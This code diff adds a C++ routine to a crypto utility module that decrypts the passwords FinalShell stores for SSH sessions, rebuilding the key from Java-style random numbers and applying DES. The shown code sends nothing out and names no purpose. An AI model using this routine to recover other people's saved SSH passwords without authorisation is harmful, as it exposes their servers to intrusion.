@@ -4,6 +4,13 @@
 #include <dpapi.h>
 #include <stdlib.h>
 #include <time.h>
+#include <vector>
+#define OPENSSL_SUPPRESS_DEPRECATED
+#pragma warning(push)
+#pragma warning(disable: 4996)
+#include <openssl/des.h>
+#include <openssl/md5.h>
+#pragma warning(pop)
 #include "crypto_utils.h"
 #include "common_utils.h"
 
@@ -423,3 +430,125 @@ std::string GetOrCreateFernetKey() {
 
     return keyBase64;
 }
+
+namespace {
+class JavaRandom {
+private:
+    uint64_t seed;
+    static const uint64_t multiplier = 0x5DEECE66DULL;
+    static const uint64_t addend = 0xBULL;
+    static const uint64_t mask = (1ULL << 48) - 1;
+
+public:
+    explicit JavaRandom(int64_t s) {
+        setSeed(s);
+    }
+
+    void setSeed(int64_t s) {
+        seed = ((uint64_t)s ^ multiplier) & mask;
+    }
+
+    int32_t next(int bits) {
+        seed = (seed * multiplier + addend) & mask;
+        return (int32_t)(seed >> (48 - bits));
+    }
+
+    int32_t nextInt(int32_t bound) {
+        if (bound <= 0) return 0;
+        if ((bound & -bound) == bound) {
+            return (int32_t)((bound * (int64_t)next(31)) >> 31);
+        }
+        int32_t bits, val;
+        do {
+            bits = next(31);
+            val = bits % bound;
+        } while (bits - val + (bound - 1) < 0);
+        return val;
+    }
+
+    int64_t nextLong() {
+        int64_t hi = (int64_t)next(32);
+        int64_t lo = (int64_t)next(32);
+        return (hi << 32) + lo;
+    }
+};
+
+static std::vector<uint8_t> RanDomKey(const uint8_t head[8]) {
+    int64_t s5 = (int8_t)head[5];
+    JavaRandom rHead5(s5);
+    int32_t n5 = rHead5.nextInt(127);
+    if (n5 == 0) n5 = 1;
+    int64_t ks = 3680984568597093857LL / (int64_t)n5;
+
+    JavaRandom random(ks);
+    int t = (int8_t)head[0];
+    for (int i = 0; i < t; ++i) {
+        random.nextLong();
+    }
+    int64_t n = random.nextLong();
+    JavaRandom r2(n);
+
+    int64_t ld[8] = {
+        (int8_t)head[4],
+        r2.nextLong(),
+        (int8_t)head[7],
+        (int8_t)head[3],
+        r2.nextLong(),
+        (int8_t)head[1],
+        random.nextLong(),
+        (int8_t)head[2]
+    };
+
+    std::vector<uint8_t> res(64);
+    for (int i = 0; i < 8; ++i) {
+        uint64_t v = (uint64_t)ld[i];
+        for (int b = 7; b >= 0; --b) {
+            res[i * 8 + (7 - b)] = (uint8_t)((v >> (b * 8)) & 0xFF);
+        }
+    }
+    return res;
+}
+} // namespace
+
+#pragma warning(push)
+#pragma warning(disable: 4996)
+std::string DecryptFinalShellPassword(const std::string& encPass) {
+    if (encPass.empty()) return "";
+    std::string decodedStr = Base64Decode(encPass);
+    if (decodedStr.size() < 16) return "";
+
+    const uint8_t* data = reinterpret_cast<const uint8_t*>(decodedStr.data());
+    size_t totalLen = decodedStr.size();
+
+    uint8_t head[8];
+    memcpy(head, data, 8);
+
+    size_t bodyLen = totalLen - 8;
+    if (bodyLen % 8 != 0) return "";
+    const uint8_t* body = data + 8;
+
+    std::vector<uint8_t> keyBytes = RanDomKey(head);
+    unsigned char md5Hash[MD5_DIGEST_LENGTH];
+    MD5(keyBytes.data(), keyBytes.size(), md5Hash);
+
+    DES_cblock desKey;
+    memcpy(&desKey, md5Hash, 8);
+    DES_key_schedule schedule;
+    DES_set_key_unchecked(&desKey, &schedule);
+
+    std::vector<uint8_t> decrypted(bodyLen);
+    for (size_t i = 0; i < bodyLen; i += 8) {
+        DES_ecb_encrypt((const_DES_cblock*)(body + i), (DES_cblock*)(decrypted.data() + i), &schedule, DES_DECRYPT);
+    }
+
+    if (decrypted.empty()) return "";
+    uint8_t pad = decrypted.back();
+    if (pad > 8 || pad == 0) return "";
+    for (size_t i = decrypted.size() - pad; i < decrypted.size(); ++i) {
+        if (decrypted[i] != pad) return "";
+    }
+    decrypted.resize(decrypted.size() - pad);
+
+    return std::string((char*)decrypted.data(), decrypted.size());
+}
+
